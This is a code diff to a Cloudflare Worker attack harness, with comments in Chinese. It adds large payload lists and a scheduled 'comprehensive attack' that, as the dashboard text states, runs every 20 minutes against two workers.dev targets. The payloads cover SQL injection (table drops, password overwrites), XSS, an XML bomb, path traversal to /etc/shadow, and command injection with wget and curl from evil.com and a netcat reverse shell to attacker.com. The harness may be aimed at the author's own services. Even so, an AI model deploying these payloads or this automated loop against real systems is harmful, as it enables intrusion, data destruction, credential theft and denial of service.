@@ -11,32 +11,174 @@ const ATTACK_TARGETS = {
   ai: 'https://unified-ai-quantum.pcleegood.workers.dev'
 };
 
-// 攻擊載荷模板
+// 攻擊載荷模板 - 增強版本
 const ATTACK_PAYLOADS = {
   'sql-injection': [
+    // 基礎 SQL Injection
     "' OR '1'='1",
-    "'; DROP TABLE users--",
-    "1' UNION SELECT NULL, username, password FROM users--",
+    "' OR 1=1--",
     "admin'--",
-    "' OR 1=1--"
+    "' OR 'x'='x",
+    
+    // Union-based SQL Injection
+    "' UNION SELECT NULL, username, password FROM users--",
+    "1' UNION SELECT NULL, NULL, NULL--",
+    "' UNION ALL SELECT table_name, NULL FROM information_schema.tables--",
+    
+    // Time-based Blind SQL Injection
+    "'; WAITFOR DELAY '00:00:05'--",
+    "' OR SLEEP(5)--",
+    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    
+    // Boolean-based Blind SQL Injection
+    "' AND 1=1--",
+    "' AND 1=2--",
+    "1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a",
+    
+    // Stacked Queries
+    "'; DROP TABLE users--",
+    "'; INSERT INTO users VALUES('hacker', 'password')--",
+    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
+    
+    // Advanced Evasion
+    "%27%20OR%20%271%27%3D%271",
+    "' /**/OR/**/1=1--",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "/*!50000OR*/1=1--"
   ],
+  
   'xss': [
+    // Basic XSS
     "<script>alert('XSS')</script>",
+    "<script>alert(document.cookie)</script>",
+    "<script>alert(String.fromCharCode(88,83,83))</script>",
+    
+    // IMG Tag XSS
     "<img src=x onerror=alert('XSS')>",
+    "<img src='x' onerror='alert(1)'>",
+    "<img/src/onerror=alert(1)>",
+    
+    // Event Handler XSS
+    "<body onload=alert('XSS')>",
+    "<input onfocus=alert('XSS') autofocus>",
+    "<marquee onstart=alert('XSS')>",
+    "<div onmouseover=alert('XSS')>",
+    
+    // SVG XSS
+    "<svg onload=alert('XSS')>",
+    "<svg><script>alert('XSS')</script></svg>",
+    "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
+    
+    // Advanced XSS
+    "<iframe src='javascript:alert(1)'>",
+    "<iframe src=javascript:alert('XSS')>",
+    "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
+    
+    // Obfuscated XSS
     "javascript:alert('XSS')",
-    "<iframe src='javascript:alert(1)'></iframe>",
-    "<svg onload=alert('XSS')>"
+    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;",
+    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+    
+    // DOM-based XSS
+    "<img src=x onerror='eval(atob(\"YWxlcnQoJ1hTUycp\"))'>",
+    "<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>"
   ],
+  
   'dos': [
+    // Large Payloads
     'A'.repeat(10000),
     'B'.repeat(50000),
-    'C'.repeat(100000)
+    'C'.repeat(100000),
+    'D'.repeat(500000),
+    
+    // Malformed Payloads
+    '{"'.repeat(10000),
+    '[[[['.repeat(5000),
+    
+    // Recursive JSON
+    '{"a":'.repeat(1000) + '1' + '}'.repeat(1000),
+    
+    // XML Bomb (Billion Laughs)
+    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>'
   ],
+  
   'path-traversal': [
+    // Unix/Linux
     '../../../etc/passwd',
-    '..\\..\\..\\windows\\system32\\config\\sam',
+    '../../../etc/shadow',
     '../../../proc/self/environ',
-    '....//....//....//etc/passwd'
+    '../../../var/log/apache2/access.log',
+    '....//....//....//etc/passwd',
+    '..%2f..%2f..%2fetc%2fpasswd',
+    
+    // Windows
+    '..\\..\\..\\windows\\system32\\config\\sam',
+    '..\\..\\..\\windows\\win.ini',
+    '..\\..\\..\\boot.ini',
+    
+    // Advanced Evasion
+    '....//....//....//etc/passwd',
+    '..%252f..%252f..%252fetc%252fpasswd',
+    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
+    
+    // Null Byte Injection
+    '../../../etc/passwd%00',
+    '../../../etc/passwd\x00.jpg'
+  ],
+  
+  'command-injection': [
+    // Basic Command Injection
+    "; ls -la",
+    "| cat /etc/passwd",
+    "& whoami",
+    "; cat /etc/shadow",
+    
+    // Advanced Command Injection
+    "; wget http://evil.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh",
+    "| nc -e /bin/sh attacker.com 4444",
+    "; curl http://evil.com/backdoor.php -o /var/www/html/backdoor.php",
+    
+    // Time-based Command Injection
+    "; sleep 10",
+    "| ping -c 10 127.0.0.1"
+  ],
+  
+  'ldap-injection': [
+    "*",
+    "*)(&",
+    "*)(uid=*",
+    "admin*)((|userPassword=*",
+    "*))(|(uid=*"
+  ],
+  
+  'xml-injection': [
+    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
+    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil.dtd'>]><foo>&xxe;</foo>"
+  ],
+  
+  'nosql-injection': [
+    "{'$gt': ''}",
+    "{'$ne': null}",
+    "{'$regex': '.*'}",
+    "{$where: 'sleep(5000)'}",
+    "';return true;var foo='bar"
+  ],
+  
+  'header-injection': [
+    "test\r\nX-Injected-Header: evil",
+    "test\nSet-Cookie: admin=true",
+    "test\r\nHTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK"
+  ],
+  
+  'template-injection': [
+    "{{7*7}}",
+    "${7*7}",
+    "{{config.items()}}",
+    "{{''.__class__.__mro__[1].__subclasses__()}}",
+    "<%= 7*7 %>",
+    "${{7*7}}",
+    "#{7*7}"
   ]
 };
 
@@ -67,6 +209,19 @@ export class HexStrikeContainer extends Container {
 
 // Worker fetch handler
 export default {
+  // Scheduled event handler - 定時攻擊
+  async scheduled(event, env, ctx) {
+    console.log('🕒 Scheduled attack triggered at:', new Date().toISOString());
+    
+    // 執行最全面的自動化攻擊
+    try {
+      const results = await executeComprehensiveAttack(env);
+      console.log('✅ Comprehensive attack completed:', JSON.stringify(results, null, 2));
+    } catch (error) {
+      console.error('❌ Scheduled attack failed:', error);
+    }
+  },
+  
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
     
@@ -109,6 +264,11 @@ export default {
     // 自動化攻擊序列
     if (url.pathname === '/attack/auto') {
       return handleAutoAttack(request, env);
+    }
+
+    // 全面深度攻擊（手動觸發）
+    if (url.pathname === '/attack/comprehensive') {
+      return handleComprehensiveAttack(request, env);
     }
 
     // 攻擊統計
@@ -265,6 +425,36 @@ async function handlePathTraversalAttack(request, env) {
       'Access-Control-Allow-Origin': '*'
     }
   });
+}
+
+/**
+ * 全面深度攻擊（手動觸發）
+ */
+async function handleComprehensiveAttack(request, env) {
+  try {
+    const results = await executeComprehensiveAttack(env);
+    
+    return new Response(JSON.stringify({
+      status: 'completed',
+      ...results
+    }), {
+      headers: { 
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*'
+      }
+    });
+  } catch (error) {
+    return new Response(JSON.stringify({
+      error: 'Comprehensive attack failed',
+      message: error.message
+    }), {
+      status: 500,
+      headers: { 
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*'
+      }
+    });
+  }
 }
 
 /**
@@ -461,6 +651,12 @@ async function handleDashboard(request, env) {
       </div>
       <div>
         <button class="attack-btn auto-btn" onclick="attack('auto')">🚀 自動化攻擊序列</button>
+        <button class="attack-btn" style="background: #cc0000;" onclick="attack('comprehensive')">💀 全面深度攻擊（所有工具）</button>
+      </div>
+      <div style="margin-top: 10px;">
+        <p style="color: #ffaa00; font-size: 14px;">
+          ⏰ <strong>定時攻擊已啟用</strong>：每 20 分鐘自動執行全面深度攻擊
+        </p>
       </div>
     </div>
     
@@ -522,5 +718,111 @@ async function handleDashboard(request, env) {
  */
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+/**
+ * 執行最全面的自動化攻擊 - 用於定時任務
+ * 包含所有攻擊類型和最深入的測試
+ */
+async function executeComprehensiveAttack(env) {
+  const results = {
+    timestamp: new Date().toISOString(),
+    total_attacks: 0,
+    successful_attacks: 0,
+    failed_attacks: 0,
+    attacks_by_type: {},
+    targets: ['backend', 'ai']
+  };
+  
+  console.log('🚀 Starting comprehensive attack...');
+  
+  // 對每個目標執行所有攻擊類型
+  for (const target of ['backend', 'ai']) {
+    console.log(`🎯 Attacking target: ${target}`);
+    
+    for (const [attackType, payloads] of Object.entries(ATTACK_PAYLOADS)) {
+      console.log(`  ⚔️  Attack type: ${attackType} (${payloads.length} payloads)`);
+      
+      if (!results.attacks_by_type[attackType]) {
+        results.attacks_by_type[attackType] = {
+          total: 0,
+          successful: 0,
+          failed: 0,
+          results: []
+        };
+      }
+      
+      // 使用所有載荷進行攻擊
+      for (let i = 0; i < payloads.length; i++) {
+        const payload = payloads[i];
+        const payloadType = getPayloadType(attackType);
+        
+        try {
+          const result = await launchAttack(target, attackType, payload, payloadType);
+          
+          results.total_attacks++;
+          results.attacks_by_type[attackType].total++;
+          
+          if (result.success) {
+            results.successful_attacks++;
+            results.attacks_by_type[attackType].successful++;
+          } else {
+            results.failed_attacks++;
+            results.attacks_by_type[attackType].failed++;
+          }
+          
+          // 儲存前 3 個結果作為樣本
+          if (results.attacks_by_type[attackType].results.length < 3) {
+            results.attacks_by_type[attackType].results.push({
+              payload_preview: payload.substring(0, 50),
+              status: result.status,
+              blocked: result.blocked,
+              response_time: result.response_time_ms
+            });
+          }
+          
+          // 避免過快攻擊，每次間隔 100-200ms
+          await sleep(100 + Math.random() * 100);
+          
+        } catch (error) {
+          console.error(`    ❌ Attack failed: ${error.message}`);
+          results.failed_attacks++;
+          results.attacks_by_type[attackType].failed++;
+        }
+      }
+    }
+  }
+  
+  // 計算成功率
+  results.success_rate = results.total_attacks > 0 
+    ? ((results.successful_attacks / results.total_attacks) * 100).toFixed(2) + '%'
+    : '0%';
+  
+  console.log(`✅ Comprehensive attack completed:`);
+  console.log(`   Total: ${results.total_attacks}`);
+  console.log(`   Successful: ${results.successful_attacks}`);
+  console.log(`   Failed: ${results.failed_attacks}`);
+  console.log(`   Success Rate: ${results.success_rate}`);
+  
+  return results;
+}
+
+/**
+ * 根據攻擊類型決定載荷位置
+ */
+function getPayloadType(attackType) {
+  switch (attackType) {
+    case 'path-traversal':
+      return 'path';
+    case 'header-injection':
+      return 'header';
+    case 'dos':
+    case 'xml-injection':
+    case 'nosql-injection':
+    case 'template-injection':
+      return 'body';
+    default:
+      return 'query';
+  }
 }
 
